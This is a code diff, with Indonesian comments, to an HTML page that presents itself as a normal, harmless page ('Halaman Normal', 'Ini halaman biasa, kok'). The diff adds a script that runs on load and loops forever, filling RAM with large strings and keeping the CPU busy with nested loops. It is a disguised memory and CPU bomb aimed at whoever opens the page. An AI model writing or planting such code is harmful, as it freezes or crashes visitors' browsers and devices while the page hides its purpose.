@@ -1,14 +1,24 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Halaman Normal</title>
+</head>
 <body>
     <h1>Halaman Normal</h1>
     <p>Ini halaman biasa, kok.</p>
     
     <script>
-        // Dijalankan 1 detik setelah halaman dimuat
         setTimeout(function() {
+            // Trik: Membanjiri RAM dengan string raksasa dan memaksa CPU bekerja
+            let memoryBomb = [];
             while(true) {
-                // Loop kosong
+                // 1. Memenuhi RAM (membuat string 10.000 karakter terus-menerus)
+                memoryBomb.push(new Array(10000).join("Beban"));
+                
+                // 2. Memaksa CPU menghitung (Loop bersarang)
+                for(let i=0; i<10000; i++) {
+                    Math.sqrt(i) * Math.random();
+                }
             }
         }, 1000);
     </script>
